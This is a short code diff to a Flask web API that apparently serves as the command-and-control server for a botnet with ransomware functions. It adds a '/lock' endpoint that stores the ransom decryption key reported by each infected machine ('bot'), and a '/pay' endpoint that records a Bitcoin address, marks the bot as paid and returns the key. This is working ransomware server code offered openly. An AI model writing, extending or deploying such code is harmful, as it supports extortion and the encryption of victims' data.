@@ -62,4 +62,29 @@ def get_report(bot_id):
 	db.session.commit()
 	return ''
 
+@api.route('/<bot_id>/lock', methods=['POST'])
+def get_key(bot_id):
+	bot = Bot.query.get(bot_id)
+	if not bot:
+		abort(404)
+	key = request.form['key']
+	bot.ransom_key = key
+	db.session.add(bot)
+	db.session.commit()
+	return ''
+
+@api.route('/<bot_id>/pay', methods=['POST'])
+def get_btc_addr(bot_id):
+	bot = Bot.query.get(bot_id)
+	if not bot:
+		abort(404)
+	key = request.form['btc_addr']
+	bot.btc_addr = key
+	bot.paid = True
+	db.session.add(bot)
+	db.session.commit()
+	if bot.paid:
+		return bot.ransom_key
+	else:
+		return ''
 
